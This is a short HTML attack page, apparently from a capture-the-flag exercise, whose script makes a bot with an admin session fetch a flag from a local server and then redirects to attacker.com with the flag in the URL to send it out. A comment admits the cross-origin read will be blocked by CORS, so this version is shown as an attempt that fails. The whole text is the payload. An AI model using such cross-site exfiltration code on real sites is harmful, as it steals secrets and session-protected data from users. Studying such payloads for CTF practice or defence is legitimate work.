<!-- hosted at attacker.com/pwn.html -->
<script>
  // 1. Fetch flag from local server (bot has admin session)
  fetch('http://127.0.0.1:5000/api/fetchflag', {credentials: 'include'})
    .then(res => res.json())      // This cross-origin read WILL be blocked by CORS
    .then(data => exfil(data.flag))
    .catch(e => console.log(e));

  function exfil(flag) {
    document.location = 'https://attacker.com/got?f=' + encodeURIComponent(flag);
  }
</script>
